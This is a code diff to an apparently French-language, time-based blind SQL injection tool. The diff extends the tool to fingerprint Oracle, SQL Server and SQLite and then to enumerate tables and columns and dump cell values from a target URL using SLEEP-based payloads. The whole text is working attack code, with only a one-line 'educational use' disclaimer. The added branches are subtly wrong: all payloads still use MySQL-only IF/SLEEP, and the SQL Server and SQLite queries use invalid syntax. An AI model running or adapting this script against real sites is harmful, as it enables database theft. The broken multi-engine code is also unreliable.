@@ -4,7 +4,7 @@ Script Naïf Time-Based Blind SQL Injection Intelligent
 ---------------------------------------------------------
 Ce script utilise des injections basées sur le temps pour extraire des informations
 de la cible (à usage pédagogique uniquement) et met en cache :
-  - Le banner du SGBD et le type (MySQL ou PostgreSQL)
+  - Le banner du SGBD et le type (MySQL, PostgreSQL, Oracle, SQL Server, SQLite)
   - Le nom de la base de données (normalisé en minuscules)
   - Le nombre et les noms des tables
   - La liste des colonnes pour chaque table (lorsqu'extraites)
@@ -168,6 +168,48 @@ def get_banner_and_dbms(url, delay):
             print_found(f"[BANNER] (unknown) => {banner_pg}")
             return banner_pg, "Unknown"
     
+    # Test avec Oracle
+    banner_oracle = extract_string(url, "(SELECT banner FROM v$version WHERE rownum=1)", delay)
+    if banner_oracle:
+        if "oracle" in banner_oracle.lower():
+            cache["banner"] = banner_oracle
+            cache["dbms"] = "Oracle"
+            print_found(f"[BANNER] => {banner_oracle}")
+            return banner_oracle, "Oracle"
+        else:
+            cache["banner"] = banner_oracle
+            cache["dbms"] = "Unknown"
+            print_found(f"[BANNER] (unknown) => {banner_oracle}")
+            return banner_oracle, "Unknown"
+    
+    # Test avec SQL Server
+    banner_sqlserver = extract_string(url, "(SELECT @@version)", delay)
+    if banner_sqlserver:
+        if "sql server" in banner_sqlserver.lower():
+            cache["banner"] = banner_sqlserver
+            cache["dbms"] = "SQL Server"
+            print_found(f"[BANNER] => {banner_sqlserver}")
+            return banner_sqlserver, "SQL Server"
+        else:
+            cache["banner"] = banner_sqlserver
+            cache["dbms"] = "Unknown"
+            print_found(f"[BANNER] (unknown) => {banner_sqlserver}")
+            return banner_sqlserver, "Unknown"
+    
+    # Test avec SQLite
+    banner_sqlite = extract_string(url, "(SELECT sqlite_version())", delay)
+    if banner_sqlite:
+        if "sqlite" in banner_sqlite.lower():
+            cache["banner"] = banner_sqlite
+            cache["dbms"] = "SQLite"
+            print_found(f"[BANNER] => {banner_sqlite}")
+            return banner_sqlite, "SQLite"
+        else:
+            cache["banner"] = banner_sqlite
+            cache["dbms"] = "Unknown"
+            print_found(f"[BANNER] (unknown) => {banner_sqlite}")
+            return banner_sqlite, "Unknown"
+    
     print_warn("No DBMS banner detected.")
     return "", "Unknown"
 
@@ -193,6 +235,24 @@ def get_database_name(url, delay):
         cache["dbname"] = db
         print_found(f"current_database() => {db}")
         return db
+    db = extract_string(url, "(SELECT global_name FROM global_name)", delay)  # Oracle
+    if db:
+        db = db.lower().strip()
+        cache["dbname"] = db
+        print_found(f"global_name => {db}")
+        return db
+    db = extract_string(url, "(SELECT DB_NAME())", delay)  # SQL Server
+    if db:
+        db = db.lower().strip()
+        cache["dbname"] = db
+        print_found(f"DB_NAME() => {db}")
+        return db
+    db = extract_string(url, "(SELECT database())", delay)  # SQLite
+    if db:
+        db = db.lower().strip()
+        cache["dbname"] = db
+        print_found(f"database() => {db}")
+        return db
     print_warn("Unable to extract database name.")
     return ""
 
@@ -204,8 +264,20 @@ def get_table_count(url, db_name, delay, max_tables=50):
     Renvoie le nombre de tables dans la base de données db_name.
     """
     print_info("Counting tables in the database...")
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL":
+        query = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')"
+    elif cache["dbms"] == "Oracle":
+        query = f"(SELECT COUNT(*) FROM all_tables WHERE owner='{db_name.upper()}')"
+    elif cache["dbms"] == "SQL Server":
+        query = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='{db_name}')"
+    elif cache["dbms"] == "SQLite":
+        query = f"(SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
+    else:
+        print_warn("Unsupported DBMS for table count extraction.")
+        return 0
+    
     for cnt in range(1, max_tables + 1):
-        payload = f"1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')={cnt}, SLEEP({delay}),0)"
+        payload = f"1 AND IF({query}={cnt}, SLEEP({delay}),0)"
         if check_condition(url, payload, delay):
             print_found(f"Table count = {cnt}")
             return cnt
@@ -216,7 +288,18 @@ def get_table_name(url, db_name, index, delay):
     """
     Extrait le nom de la table d'indice 'index' (0-based) depuis information_schema.tables.
     """
-    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index},1"
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL":
+        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index},1"
+    elif cache["dbms"] == "Oracle":
+        query = f"SELECT table_name FROM all_tables WHERE owner='{db_name.upper()}' OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY"
+    elif cache["dbms"] == "SQL Server":
+        query = f"SELECT table_name FROM information_schema.tables WHERE table_catalog='{db_name}' ORDER BY table_name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY"
+    elif cache["dbms"] == "SQLite":
+        query = f"SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT {index},1"
+    else:
+        print_warn("Unsupported DBMS for table name extraction.")
+        return ""
+    
     print_info(f"Retrieving table #{index + 1} name...")
     tname = extract_string(url, query, delay)
     return tname.strip()
@@ -229,9 +312,20 @@ def get_column_count(url, db_name, table_name, delay, max_cols=50):
     Renvoie le nombre de colonnes pour la table table_name.
     """
     print_info(f"Counting columns in table '{table_name}'...")
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL":
+        query = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}')"
+    elif cache["dbms"] == "Oracle":
+        query = f"(SELECT COUNT(*) FROM all_tab_columns WHERE owner='{db_name.upper()}' AND table_name='{table_name.upper()}')"
+    elif cache["dbms"] == "SQL Server":
+        query = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_catalog='{db_name}' AND table_name='{table_name}')"
+    elif cache["dbms"] == "SQLite":
+        query = f"(SELECT COUNT(*) FROM pragma_table_info('{table_name}'))"
+    else:
+        print_warn("Unsupported DBMS for column count extraction.")
+        return 0
+    
     for cnt in range(1, max_cols + 1):
-        payload = (f"1 AND IF((SELECT COUNT(*) FROM information_schema.columns "
-                   f"WHERE table_schema='{db_name}' AND table_name='{table_name}')={cnt}, SLEEP({delay}),0)")
+        payload = f"1 AND IF({query}={cnt}, SLEEP({delay}),0)"
         if check_condition(url, payload, delay):
             print_found(f"Column count in '{table_name}' = {cnt}")
             return cnt
@@ -242,7 +336,18 @@ def get_column_name(url, db_name, table_name, index, delay):
     """
     Extrait le nom de la colonne d'indice 'index' (0-based) depuis information_schema.columns.
     """
-    query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {index},1"
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL":
+        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {index},1"
+    elif cache["dbms"] == "Oracle":
+        query = f"SELECT column_name FROM all_tab_columns WHERE owner='{db_name.upper()}' AND table_name='{table_name.upper()}' OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY"
+    elif cache["dbms"] == "SQL Server":
+        query = f"SELECT column_name FROM information_schema.columns WHERE table_catalog='{db_name}' AND table_name='{table_name}' ORDER BY column_name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY"
+    elif cache["dbms"] == "SQLite":
+        query = f"SELECT name FROM pragma_table_info('{table_name}') LIMIT {index},1"
+    else:
+        print_warn("Unsupported DBMS for column name extraction.")
+        return ""
+    
     print_info(f"Retrieving column #{index + 1} name from table '{table_name}'...")
     colname = extract_string(url, query, delay)
     return colname.strip()
@@ -255,8 +360,18 @@ def get_row_count(url, db_name, table_name, delay, max_rows=50):
     Renvoie le nombre de lignes dans la table table_name.
     """
     print_info(f"Counting rows in table '{table_name}'...")
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL" or cache["dbms"] == "SQL Server":
+        query = f"(SELECT COUNT(*) FROM `{db_name}`.`{table_name}`)"
+    elif cache["dbms"] == "Oracle":
+        query = f"(SELECT COUNT(*) FROM {db_name}.{table_name})"
+    elif cache["dbms"] == "SQLite":
+        query = f"(SELECT COUNT(*) FROM {table_name})"
+    else:
+        print_warn("Unsupported DBMS for row count extraction.")
+        return 0
+    
     for r in range(1, max_rows + 1):
-        payload = f"1 AND IF((SELECT COUNT(*) FROM `{db_name}`.`{table_name}`)={r}, SLEEP({delay}),0)"
+        payload = f"1 AND IF({query}={r}, SLEEP({delay}),0)"
         if check_condition(url, payload, delay):
             print_found(f"Row count in '{table_name}' = {r}")
             return r
@@ -267,7 +382,16 @@ def get_cell_value(url, db_name, table_name, column_name, row_index, delay):
     """
     Extrait la valeur de la cellule (row_index, column_name) via SUBSTRING.
     """
-    query = f"SELECT `{column_name}` FROM `{db_name}`.`{table_name}` LIMIT {row_index},1"
+    if cache["dbms"] == "MySQL" or cache["dbms"] == "PostgreSQL" or cache["dbms"] == "SQL Server":
+        query = f"SELECT `{column_name}` FROM `{db_name}`.`{table_name}` LIMIT {row_index},1"
+    elif cache["dbms"] == "Oracle":
+        query = f"SELECT {column_name} FROM {db_name}.{table_name} OFFSET {row_index} ROWS FETCH NEXT 1 ROWS ONLY"
+    elif cache["dbms"] == "SQLite":
+        query = f"SELECT {column_name} FROM {table_name} LIMIT {row_index},1"
+    else:
+        print_warn("Unsupported DBMS for cell value extraction.")
+        return ""
+    
     print_info(f"Extracting value for '{column_name}', row {row_index + 1}...")
     cell_val = extract_string(url, query, delay)
     return cell_val.strip()
